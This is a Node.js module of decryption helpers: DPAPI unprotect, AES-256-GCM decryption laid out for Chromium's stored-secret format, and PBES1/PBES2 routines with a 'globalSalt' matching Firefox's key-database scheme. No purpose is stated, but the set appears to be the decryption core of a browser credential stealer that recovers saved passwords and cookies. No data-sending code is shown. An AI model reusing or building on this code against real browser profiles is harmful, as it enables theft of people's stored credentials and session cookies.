const forge = require('node-forge');
const crypto = require('crypto');

const { Dpapi } = require('@primno/dpapi');

const DPAPI = (encryptedData, entropy, scope) => {
    if (!encryptedData || !encryptedData.length) return new Error("No data provided to decrypt");
    try {
        return Dpapi.unprotectData(encryptedData, entropy, scope);
    } catch (err) {
        return null;
    }
};

const decryptAES256GCM = (key, value) => {
    const iv = value.slice(3, 15);
    const encryptedData = value.slice(15, -16);
    const authTag = value.slice(-16);
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(authTag);
    let decrypted = decipher.update(encryptedData, 'base64', 'utf-8');
    decrypted += decipher.final('utf-8');
    return decrypted;
};

const decryptedData = (encryptedData, initializationVector, masterKey, algorithm) => {
    const decipher = forge.cipher.createDecipher(algorithm, masterKey);
    decipher.start({ iv: initializationVector });
    decipher.update(forge.util.createBuffer(encryptedData));
    const success = decipher.finish();
    return success ? decipher.output : null;
};

const hashWithSHA1 = (inputData) => {
    const sha1Hash = forge.md.sha1.create();
    sha1Hash.update(inputData, 'raw');
    return sha1Hash.digest().data;
};

const padingArrayToLength = (array, targetLength) => {
    if (array.length >= targetLength) return array;
    const paddedArray = new Uint8Array(targetLength);
    paddedArray.set(array);
    return paddedArray;
};

const computeHMACSHA1 = (inputData, secretKey) => {
    const hmacInstance = forge.hmac.create();
    hmacInstance.start('sha1', secretKey);
    hmacInstance.update(inputData, 'raw');
    return hmacInstance.digest().data;
};

const bufferToByteString = (buffer) => {
    return String.fromCharCode(...new Uint8Array(buffer));
};

const stringToUtf8ByteString = (str) => {
    return forge.util.encodeUtf8(str);
};

const stringToUint8Array = (str) => {
    return Uint8Array.from(str, char => char.charCodeAt(0));
};

const decodeB64ASN1Data = (code64) => {
    const ASN1 = forge.asn1.fromDer(forge.util.decode64(code64)).value;
    return {
        iv: ASN1[1].value[1].value,
        data: ASN1[2].value
    };
};

const decryptUsingPBES1 = (decodedSequence, password, globalSalt) => {
    const encryptedData = decodedSequence[1].value;
    const salt = decodedSequence[0].value[1].value[0].value;
    const hashedPassword = hashWithSHA1(globalSalt + password);
    const paddedSalt = bufferToByteString(padingArrayToLength(stringToUint8Array(salt), 20).buffer);
    const combinedHash = hashWithSHA1(hashedPassword + salt);
    const key1 = computeHMACSHA1(paddedSalt + salt, combinedHash);
    const temporaryKey = computeHMACSHA1(paddedSalt, combinedHash);
    const key2 = computeHMACSHA1(temporaryKey + salt, combinedHash);
    const combinedKey = key1 + key2;

    const keyBuffer = forge.util.createBuffer(combinedKey);
    const key = keyBuffer.getBytes(24);
    const iv = keyBuffer.getBytes(8);

    return decryptedData(encryptedData, iv, key, '3DES-CBC');
};

const decryptUsingPBES2 = (decodedSequence, password, globalSalt) => {
    const encryptedData = decodedSequence[1].value;
    const pbkdf2Parameters = decodedSequence[0].value[1].value[0].value[1].value;
    const salt = pbkdf2Parameters[0].value;
    const iterations = pbkdf2Parameters[1].value.charCodeAt(0);
    const initializationVector = `\x04\x0e${decodedSequence[0].value[1].value[1].value[1].value}`;
    const hashedKey = hashWithSHA1(globalSalt + password);
    const derivedKey = forge.pkcs5.pbkdf2(hashedKey, salt, iterations, 32, forge.md.sha256.create());

    return decryptedData(encryptedData, initializationVector, derivedKey, 'AES-CBC');
};

const PBESDecrypt = (decodedSequence, password, globalSalt) => {
    if (decodedSequence[0].value[1].value[0].value[1].value) {
        return decryptUsingPBES2(decodedSequence, password, globalSalt);
    }
    return decryptUsingPBES1(decodedSequence, password, globalSalt);
};

const decryptWithPBES = (encryptedData, passwordBytes, salt) => {
    const asn1Data = forge.asn1.fromDer(encryptedData);
    return PBESDecrypt(asn1Data.value, passwordBytes, salt);
};

module.exports = {
    DPAPI,
    stringToUtf8ByteString,
    decryptWithPBES,
    decryptAES256GCM,
    bufferToByteString,
    decodeB64ASN1Data,
    decryptedData
};
